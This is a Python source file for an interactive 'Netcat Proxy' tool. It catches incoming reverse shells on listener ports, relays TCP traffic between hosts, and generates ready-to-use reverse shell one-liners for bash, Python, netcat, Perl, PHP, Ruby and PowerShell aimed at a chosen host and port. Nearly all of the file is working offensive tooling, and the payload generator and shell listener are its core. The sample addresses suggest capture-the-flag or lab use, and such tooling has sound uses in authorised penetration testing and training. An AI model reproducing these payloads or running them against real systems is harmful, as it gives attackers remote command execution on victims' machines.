#!/usr/bin/env python3
"""
StrategicKhaos Netcat Proxy - Sovereign Network Operations
Shell catching, port relays, and payload generation
"""

import socket
import threading
import sys
import select
from typing import Optional, Dict, List


class NetcatProxy:
    """Netcat-like proxy for reverse shells and port forwarding"""
    
    def __init__(self):
        self.listeners: Dict[int, threading.Thread] = {}
        self.relays: Dict[int, threading.Thread] = {}
        self.active_shells: List[Dict] = []
        
    def listen(self, port: int, shell_type: str = "reverse"):
        """Start a listener on the specified port"""
        if port in self.listeners:
            print(f"[!] Listener already exists on port {port}")
            return
        
        def _listen_thread():
            try:
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                server.bind(('0.0.0.0', port))
                server.listen(5)
                print(f"[+] Listener started on port {port} ({shell_type} shell)")
                
                while True:
                    client, addr = server.accept()
                    print(f"[+] Connection received from {addr[0]}:{addr[1]}")
                    
                    self.active_shells.append({
                        'client': client,
                        'addr': addr,
                        'port': port,
                        'type': shell_type
                    })
                    
                    # Handle shell interaction
                    shell_thread = threading.Thread(
                        target=self._handle_shell,
                        args=(client, addr)
                    )
                    shell_thread.daemon = True
                    shell_thread.start()
                    
            except Exception as e:
                print(f"[!] Listener error on port {port}: {e}")
        
        thread = threading.Thread(target=_listen_thread)
        thread.daemon = True
        thread.start()
        self.listeners[port] = thread
    
    def _handle_shell(self, client: socket.socket, addr: tuple):
        """Handle interactive shell session"""
        print(f"[+] Interactive shell from {addr[0]}:{addr[1]}")
        print("[*] Type 'exit' to close connection")
        
        try:
            while True:
                # Check for data from client
                ready = select.select([client], [], [], 0.1)
                if ready[0]:
                    data = client.recv(4096)
                    if not data:
                        break
                    print(data.decode('utf-8', errors='ignore'), end='')
                
        except Exception as e:
            print(f"[!] Shell error: {e}")
        finally:
            client.close()
            print(f"[+] Connection closed from {addr[0]}:{addr[1]}")
    
    def relay(self, local_port: int, remote_host: str, remote_port: int):
        """Create a port relay/tunnel"""
        if local_port in self.relays:
            print(f"[!] Relay already exists on port {local_port}")
            return
        
        def _relay_thread():
            try:
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                server.bind(('0.0.0.0', local_port))
                server.listen(5)
                print(f"[+] Relay created: localhost:{local_port} → {remote_host}:{remote_port}")
                
                while True:
                    client, addr = server.accept()
                    
                    # Connect to remote
                    try:
                        remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        remote.connect((remote_host, remote_port))
                        print(f"[+] Relay connection: {addr[0]}:{addr[1]} → {remote_host}:{remote_port}")
                        
                        # Bidirectional relay
                        client_to_remote = threading.Thread(
                            target=self._pipe_data,
                            args=(client, remote, "C→R")
                        )
                        remote_to_client = threading.Thread(
                            target=self._pipe_data,
                            args=(remote, client, "R→C")
                        )
                        
                        client_to_remote.daemon = True
                        remote_to_client.daemon = True
                        
                        client_to_remote.start()
                        remote_to_client.start()
                        
                    except Exception as e:
                        print(f"[!] Relay connection failed: {e}")
                        client.close()
                        
            except Exception as e:
                print(f"[!] Relay error on port {local_port}: {e}")
        
        thread = threading.Thread(target=_relay_thread)
        thread.daemon = True
        thread.start()
        self.relays[local_port] = thread
    
    def _pipe_data(self, src: socket.socket, dst: socket.socket, label: str):
        """Pipe data between two sockets"""
        try:
            while True:
                data = src.recv(4096)
                if not data:
                    break
                dst.sendall(data)
        except Exception:
            pass
        finally:
            try:
                src.close()
                dst.close()
            except Exception:
                pass
    
    def generate_shells(self, lhost: str, lport: int):
        """Generate reverse shell payloads"""
        print(f"\n🐚 Reverse Shell Payloads:\n")
        
        payloads = {
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "python": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "nc": f"nc -e /bin/bash {lhost} {lport}",
            "nc-alt": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
            "perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            "powershell": f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""
        }
        
        for lang, payload in payloads.items():
            print(f"[{lang}]")
            print(payload)
            print()
    
    def list_status(self):
        """List active listeners and relays"""
        print("\n📊 Active Connections:\n")
        
        if self.listeners:
            print("Listeners:")
            for port in self.listeners:
                print(f"  Port {port}: Active")
        else:
            print("Listeners: None")
        
        if self.relays:
            print("\nRelays:")
            for port in self.relays:
                print(f"  Port {port}: Active")
        else:
            print("\nRelays: None")
        
        if self.active_shells:
            print(f"\nActive Shells: {len(self.active_shells)}")
        else:
            print("\nActive Shells: 0")


def print_banner():
    """Print Netcat Proxy banner"""
    print("╔" + "═" * 66 + "╗")
    print("║" + " " * 12 + "STRATEGICKHAOS NETCAT PROXY v1.0" + " " * 22 + "║")
    print("║" + " " * 16 + "Sovereign Network Operations" + " " * 22 + "║")
    print("╚" + "═" * 66 + "╝")
    print()


def print_help():
    """Print help information"""
    print("""
Available Commands:
  listen <port> [type]           - Start listener (default: reverse shell)
  relay <lport> <rhost> <rport>  - Create port relay/tunnel
  shells <lhost> <lport>         - Generate reverse shell payloads
  status                         - Show active connections
  help                           - Show this help message
  exit                           - Exit proxy

Examples:
  listen 4444 reverse
  relay 8080 10.10.10.5 80
  shells 10.10.14.5 4444
    """)


def main():
    """Main CLI loop"""
    print_banner()
    
    proxy = NetcatProxy()
    
    print("Type 'help' for available commands, 'exit' to quit\n")
    
    while True:
        try:
            user_input = input("nc> ").strip()
            
            if not user_input:
                continue
            
            parts = user_input.split()
            cmd = parts[0].lower()
            
            if cmd in ['exit', 'quit', 'q']:
                print("👋 Exiting Netcat Proxy")
                break
            
            elif cmd == 'help':
                print_help()
            
            elif cmd == 'listen':
                if len(parts) < 2:
                    print("[!] Usage: listen <port> [type]")
                    continue
                port = int(parts[1])
                shell_type = parts[2] if len(parts) > 2 else "reverse"
                proxy.listen(port, shell_type)
            
            elif cmd == 'relay':
                if len(parts) < 4:
                    print("[!] Usage: relay <lport> <rhost> <rport>")
                    continue
                lport = int(parts[1])
                rhost = parts[2]
                rport = int(parts[3])
                proxy.relay(lport, rhost, rport)
            
            elif cmd == 'shells':
                if len(parts) < 3:
                    print("[!] Usage: shells <lhost> <lport>")
                    continue
                lhost = parts[1]
                lport = int(parts[2])
                proxy.generate_shells(lhost, lport)
            
            elif cmd == 'status':
                proxy.list_status()
            
            else:
                print(f"[!] Unknown command: {cmd}")
                print("Type 'help' for available commands")
                
        except KeyboardInterrupt:
            print("\n👋 Exiting Netcat Proxy")
            break
        except ValueError as e:
            print(f"[!] Invalid input: {e}")
        except Exception as e:
            print(f"[!] Error: {e}")


if __name__ == "__main__":
    main()
